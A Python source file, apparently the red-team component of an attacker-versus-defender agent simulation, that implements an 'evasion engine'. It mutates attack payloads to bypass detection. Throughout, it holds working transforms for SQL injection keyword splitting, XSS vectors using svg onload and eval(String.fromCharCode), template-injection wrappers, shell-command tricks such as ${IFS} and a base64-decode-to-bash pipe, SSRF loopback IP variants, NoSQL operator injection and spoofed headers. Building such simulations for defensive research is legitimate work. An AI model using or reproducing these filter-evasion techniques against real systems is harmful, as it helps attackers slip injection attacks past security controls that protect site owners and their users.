"""
Red Agent — Evasion Strategy Engine.

When a technique is blocked by the Blue Agent, this engine mutates
the payload using MITRE-catalogued evasion variants to bypass detection.

Supported evasion transforms:
  - unicode_encode          : Encode chars as Unicode \\uXXXX
  - double_url_encode       : %252F style double encoding
  - comment_injection       : SQL/shell comment obfuscation
  - case_variation          : MiX cAsE keywords
  - whitespace_obfuscation  : Tabs, newlines, extra spaces
  - hex_encode              : 0x hex literals
  - null_byte_injection     : %00 / \\x00 insertion
  - unicode_slash           : \\u002f instead of /
  - html_entity_encode      : &lt; &gt; etc.
  - javascript_obfuscation  : String.fromCharCode style
  - event_handler_variation : Different XSS event handlers
  - svg_payload             : SVG-based XSS vector
  - template_literal_injection: ${} or {{}} patterns
  - command_separator_variation: Different shell separators
  - shell_variable_insertion: $IFS, ${PATH} tricks
  - backtick_substitution   : `cmd` style
  - dollar_brace_expansion  : ${cmd} expansion
  - base64_decode_exec      : echo|base64 -d|bash
  - slow_timing             : Spacing out requests (meta)
  - user_agent_rotation     : Different user-agent (meta)
  - parameter_pollution     : Duplicate param names
  - header_injection        : Inject via HTTP headers
  - http_verb_tampering     : Use unusual HTTP verbs
  - chunked_parameter       : Split payload across params
  - decimal_ip              : Decimal IP address form
  - octal_ip                : Octal IP representation
  - ipv6_loopback           : ::1 instead of 127.0.0.1
  - redirect_chain          : Use open redirects
  - json_injection          : JSON operator injection
  - operator_injection      : NoSQL $operators
  - noise_injection         : Extra junk params
  - overlong_utf8           : Overlong UTF-8 sequences
"""
from __future__ import annotations

import base64
import random
import urllib.parse
from typing import Any

from blue_agent.logging_cfg import get_logger

log = get_logger("red.evasion")


# ---------------------------------------------------------------------------
# Core transform functions
# ---------------------------------------------------------------------------

def _unicode_encode(payload: str) -> str:
    """Encode non-ASCII and some ASCII chars as \\uXXXX."""
    result = []
    for ch in payload:
        if ch.isalpha() and random.random() < 0.4:
            result.append(f"\\u{ord(ch):04x}")
        else:
            result.append(ch)
    return "".join(result)


def _double_url_encode(payload: str) -> str:
    """Double URL-encode the payload."""
    once = urllib.parse.quote(payload, safe="")
    return urllib.parse.quote(once, safe="")


def _comment_injection(payload: str) -> str:
    """Inject SQL/shell comments to break keyword patterns."""
    # For SQL: SELECT -> SEL/**/ECT
    transforms = [
        ("SELECT", "SEL/**/ECT"),
        ("UNION", "UN/**/ION"),
        ("WHERE", "WH/**/ERE"),
        ("OR", "O/**/R"),
        ("AND", "AN/**/D"),
        ("sleep(", "sle/**/ep("),
        ("SLEEP(", "SLE/**/EP("),
    ]
    result = payload
    for old, new in transforms:
        result = result.replace(old, new)
        result = result.replace(old.lower(), new.lower())
    return result


def _case_variation(payload: str) -> str:
    """Randomize ASCII casing."""
    return "".join(
        ch.upper() if random.random() > 0.5 else ch.lower()
        for ch in payload
    )


def _whitespace_obfuscation(payload: str) -> str:
    """Replace spaces with tabs/newlines in SQL payloads."""
    result = payload.replace(" ", random.choice(["\t", "\n", "\r\n", "  "]))
    return result


def _hex_encode_sql(payload: str) -> str:
    """Replace string literals with 0x hex equivalents where possible."""
    # Convert simple string args to hex — wrap in CHAR() for readability
    import re
    def to_hex(m: re.Match) -> str:
        s = m.group(1)
        hex_vals = ",".join(str(ord(c)) for c in s)
        return f"CHAR({hex_vals})"
    return re.sub(r"'([^']{1,30})'", to_hex, payload)


def _null_byte_injection(payload: str) -> str:
    """Insert null byte near the end to truncate extension checks."""
    idx = max(0, len(payload) - 4)
    return payload[:idx] + "%00" + payload[idx:]


def _html_entity_encode(payload: str) -> str:
    """Encode < > " ' with HTML entities."""
    return (payload
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"))


def _javascript_obfuscation(payload: str) -> str:
    """Use String.fromCharCode to avoid literal keyword detection."""
    return "eval(String.fromCharCode(" + ",".join(str(ord(c)) for c in payload) + "))"


def _svg_payload(base: str) -> str:
    """Wrap payload in SVG onload vector."""
    return f'<svg onload="{base}"/>'


def _event_handler_variation(payload: str) -> str:
    """Replace onload/onerror with a less common event handler."""
    handlers = ["onfocus", "onmouseover", "onpointerover", "ontoggle", "onanimationend"]
    tag_options = [
        f'<img src=x {random.choice(handlers)}="{payload}">',
        f'<details open {random.choice(handlers)}="{payload}">',
        f'<body {random.choice(handlers)}="{payload}">',
    ]
    return random.choice(tag_options)


def _template_literal_injection(payload: str) -> str:
    """Try SSTI variants: Jinja2, Freemarker, Twig."""
    templates = [
        "{{" + payload + "}}",
        "${" + payload + "}",
        "#{" + payload + "}",
        "<%= " + payload + " %>",
    ]
    return random.choice(templates)


def _command_separator_variation(payload: str) -> str:
    """Use different shell separators."""
    separators = [";", "&&", "||", "|", "\n", "\r\n"]
    sep = random.choice(separators)
    # Append the separator before the injected command
    return payload.replace(";", sep).replace("&&", sep)


def _base64_decode_exec(payload: str) -> str:
    """Encode command as base64 and decode+exec at runtime."""
    b64 = base64.b64encode(payload.encode()).decode()
    return f"echo {b64}|base64 -d|bash"


def _parameter_pollution(payload: str) -> str:
    """Return original — actual pollution happens at request-build level."""
    return payload  # handled during request construction


def _decimal_ip(url: str) -> str:
    """Convert 127.0.0.1 to decimal integer form (2130706433)."""
    return url.replace("127.0.0.1", "2130706433").replace("localhost", "2130706433")


def _ipv6_loopback(url: str) -> str:
    """Use IPv6 loopback instead of 127.0.0.1."""
    return url.replace("127.0.0.1", "[::1]").replace("localhost", "[::1]")


def _json_operator_injection(payload: str) -> str:
    """Return a NoSQL operator injection payload."""
    return '{"$ne": null}'


# ---------------------------------------------------------------------------
# Dispatch table
# ---------------------------------------------------------------------------

_TRANSFORMS: dict[str, Any] = {
    "unicode_encode": _unicode_encode,
    "double_url_encode": _double_url_encode,
    "comment_injection": _comment_injection,
    "case_variation": _case_variation,
    "whitespace_obfuscation": _whitespace_obfuscation,
    "hex_encode": _hex_encode_sql,
    "null_byte_injection": _null_byte_injection,
    "unicode_slash": lambda p: p.replace("/", "\\u002f"),
    "html_entity_encode": _html_entity_encode,
    "javascript_obfuscation": _javascript_obfuscation,
    "event_handler_variation": _event_handler_variation,
    "svg_payload": _svg_payload,
    "template_literal_injection": _template_literal_injection,
    "command_separator_variation": _command_separator_variation,
    "shell_variable_insertion": lambda p: p.replace(" ", "${IFS}"),
    "backtick_substitution": lambda p: p.replace("$(", "`").replace(")", "`"),
    "dollar_brace_expansion": lambda p: "${" + p + "}",
    "base64_decode_exec": _base64_decode_exec,
    "parameter_pollution": _parameter_pollution,
    "decimal_ip": _decimal_ip,
    "octal_ip": lambda p: p.replace("127.0.0.1", "0177.0.0.1"),
    "ipv6_loopback": _ipv6_loopback,
    "json_injection": _json_operator_injection,
    "operator_injection": _json_operator_injection,
    "overlong_utf8": lambda p: p.replace("/", "%c0%af"),
    # Meta-transforms (no payload mutation, handled at request level)
    "slow_timing": lambda p: p,
    "user_agent_rotation": lambda p: p,
    "noise_injection": lambda p: p,
    "redirect_chain": lambda p: p,
    "chunked_parameter": lambda p: p,
    "header_injection": lambda p: p,
    "http_verb_tampering": lambda p: p,
    "session_rotation": lambda p: p,
    "distributed_source": lambda p: p,
    "legitimate_referer": lambda p: p,
    "random_order": lambda p: p,
    "alg_none_attack": lambda p: p,
    "key_confusion": lambda p: p,
    "slow_loris": lambda p: p,
    "large_payload": lambda p: p + "A" * 1024,
    "connection_exhaustion": lambda p: p,
    "dns_rebinding": lambda p: p,
    "ifs_separation": lambda p: p.replace(" ", "${IFS}"),
}


class EvasionEngine:
    """
    Mutates a payload using a named evasion variant.

    Usage::

        engine = EvasionEngine()
        mutated = engine.apply("comment_injection", original_payload)
    """

    def apply(self, variant: str, payload: str) -> str:
        """Apply the named evasion transform to the payload."""
        transform = _TRANSFORMS.get(variant)
        if transform is None:
            log.warning("evasion_variant_unknown", variant=variant)
            return payload
        try:
            result = transform(payload)
            log.info("evasion_applied", variant=variant,
                     original_len=len(payload), mutated_len=len(result))
            return result
        except Exception as exc:
            log.warning("evasion_transform_failed", variant=variant, error=str(exc))
            return payload

    def apply_random_from(self, variants: list[str], payload: str) -> tuple[str, str]:
        """
        Apply a random variant from the list.
        Returns (mutated_payload, variant_name).
        """
        if not variants:
            return payload, "none"
        variant = random.choice(variants)
        return self.apply(variant, payload), variant

    @staticmethod
    def meta_headers(variant: str, source_ip: str = "127.0.0.1") -> dict[str, str]:
        """
        Return extra HTTP headers for meta-level evasion variants.
        These don't mutate the payload but change request properties.
        """
        extras: dict[str, str] = {}
        if variant == "user_agent_rotation":
            agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Googlebot/2.1 (+http://www.google.com/bot.html)",
                "curl/7.64.1",
                "python-httpx/0.26.0",
                "PostmanRuntime/7.32.3",
            ]
            extras["User-Agent"] = random.choice(agents)
        elif variant == "legitimate_referer":
            extras["Referer"] = "https://www.google.com/search?q=site:target"
        elif variant == "header_injection":
            extras["X-Forwarded-For"] = source_ip
            extras["X-Real-IP"] = source_ip
        elif variant == "http_verb_tampering":
            # Caller should override method; we signal it via a header
            extras["X-HTTP-Method-Override"] = "DELETE"
        return extras
